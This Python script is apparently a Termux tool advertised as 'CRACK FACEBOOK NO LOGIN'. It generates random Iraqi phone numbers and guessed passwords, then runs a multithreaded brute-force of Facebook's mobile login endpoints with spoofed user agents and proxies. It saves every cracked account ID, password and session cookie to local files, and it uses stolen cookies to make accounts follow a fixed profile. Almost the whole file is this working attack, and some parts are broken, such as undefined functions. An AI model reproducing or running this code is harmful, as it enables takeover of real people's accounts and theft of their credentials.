

W = '\x1b[1;97m' # write
R = '\x1b[1;91m' # red
G = '\x1b[1;92m' # Green
Y = '\x1b[1;93m' # Yellow
B = '\x1b[1;94m' # bule
P = '\x1b[1;95m' # pink
nb = '\x1b[1;96m' # Bule 50%
A = '\x1b[1;90m' # DEFULAT

import os
import sys
import time
import requests
import uuid
from os import system as s
#os.system('termux-setup-storage')
#os.system('git pull')
#os.system('pkg install curl')


class sefat:
    
    def __init__(self, z):
        pass




    



import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
                  
            
 
class sefat:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mWelcome  \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents



ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('[[\1b[1;92m•\1b[1;97m] [\1b[1;96mAlkerm')
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):

	aa='Mozilla/5.0 (iPad; CPU OS '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='OS X)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/604.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	
	
#Mozilla/5.0 (iPad; CPU OS 8;  OS X)S187V) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/83.0.4466.51 Mobile/15E148 Safari/604.1
	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

	

#------------[ INDICATION ]---------------#

logo =                                          ("""
███▄ ▄███▓ ▒█████   ███▄ ▄███▓▓█████ 
▓██▒▀█▀ ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀ 
▓██    ▓██░▒██░  ██▒▓██    ▓██░▒███   
▒██    ▒██ ▒██   ██░▒██    ▒██ ▒▓█  ▄ 
▒██▒   ░██▒░ ████▓▒░▒██▒   ░██▒░▒████▒
░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░
░  ░      ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░
░      ░   ░ ░ ░ ▒  ░      ░      ░   
       ░       ░ ░         ░      ░  ░
                                                 
              
\033[1;97m==========================MOME TAMAN=====================================
\033[1;37m[-] AUTHOR    :\033[1;32m@SAROKMOMETAMAN
\033[1;37m[-] NRXI TOOL :\033[1;32m 10$
\033[1;37m[-] TOOLS      :\033[1;32m CRACK FACEBOOK NO LOGIN
\033[1;37m[-] VERSION   :\033[1;32m V.9
\033[1;37m[-] STATUS    :\033[1;32mMOMETAMAN 『MOME』
\033[1;97m===============================================================""")
    
# APK CHECK


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print(" [1] XOE PASS DADA NET")
		print(" [0] LOGOUT\n")
		IPYTHONI =input(" [√] Choose : ")
		if IPYTHONI in ["1", "01"]:
			o()
		if IPYTHONI in ["2", "02"]:
			i()
		if IPYTHONI in ["3", "03"]:
			random_number()
		if IPYTHONI in ["0", "00"]:
			exit()


def o():
    user=[]
    twf =[]
    pwx = []
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    tl = str(len(user))
    #print(f'{B} [{R}1{B}]{P} 6 DIGIT')
   # print(f'{B} [{R}2{B}]{P} 8 DIGIT')
    print(f'{B} [{R}1{B}]{P}AUTO PASOWRD CLONING')
    code = input(f'\n{R} [{B}+{R}] {P}CODE : ')
    print("")
    limit = int(input(" [+] CHAND IDS AWE : "))
    for s in range(limit):
        x = 11111111
        xx = 99999999
        cod = '+964750'
        one = random.randint(x, xx)
        user.append(cod + str(one))
    HamiiID = []
    print("")
    for bilal in range(1):
        for uaaa in user:
            pww = uaaa[8:14]
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;92m TOTAL IDS : '+tl)
        print('')
        print('\033[1;31m TKAEA SABR BGRA BO CRAK  5 MIN\033[1;97m')
        print(63*'=')
        print('')
        for love in user:
            pwx = []
            uid = love
            pwww = love[3:14]
            for Eman in HamiiID:
                pwx.append(pwww)
                pwx.append(Eman)
                pwx.append('hama123')
                pwx.append('hama1234')
                pwx.append('hama12345')
                pwx.append('hamahama')
                pwx.append('123zaxo')
                pwx.append('123hama')
                pwx.append('kcha123')
                pwx.append('ahmad123')
                pwx.append('hama0102')
                pwx.append('kurdstan123')
                pwx.append('07700770')
                pwx.append('dana12345')
                pwx.append('kurd123')
                pwx.append('zaxo123')
                pwx.append('zaxo123123')
                pwx.append('zaxo12345')
                pwx.append('zaxozaxo')
                pwx.append('zaxo123456789')
                pwx.append('hama0000')
                pwx.append('ahmad123')
                pwx.append('muhamad123')
                pwx.append('muhamad1234')
                pwx.append('zaxo123456')
                pwx.append('zaxo12345')
                pwx.append('zaxo10')
                pwx.append('zaxo0000')
                manshera.submit(rcrack2,uid,pwx,tl)









def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92MOME\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[MOME-OK] {cid} | {ps}")
                print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m][📌] :\033[1;92m {coki}")
                #print(f'{B}User Agent--> {pro} \n')
                cek_apk(session,coki)
                print('')
                open('/sdcard/MOMETAMAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[MOMETAMAN-CP] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/MOME-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[MOME] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}IPYTHONI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
        
def rcrack2(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mMOME\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            #sys.stdout.write('\r[\033[1;92mIPYTHONI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			#sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[MOME-OK] {cid} | {ps}")
                print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m]❤️‍🔥] :\033[1;92m {coki}")
                #print(f'{B}User Agent--> {pro} \n')
                cek_apk(session,coki)
                print('')
                open('/sdcard/MOME-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[MOME-CP🥺💔] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/MOME-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[MOME] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}IPYTHONI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass

def rcrack3(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92MOME\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            #sys.stdout.write('\r[\033[1;92mIPYTHONI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			#sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[MOME-OK] {cid} | {ps}")
                print(f"\033[1;97m[\033[1;91mCOOKIE\033[1;97m][📌] :\033[1;92m {coki}")
                #print(f'{B}User Agent--> {pro} \n')
                cek_apk(session,coki)
                print('')
                open('/sdcard/MOME-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f"\x1b[38;5;196m[MOME-CP] {cid} | {ps}")
                #print(f'{W}CP-UA--> {pro}\n ')
                open('/sdcard/MOME-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r[MOME] [%s/%s]  \033[1;92mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}IPYTHONI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass


#i()
#o()
Main()
 
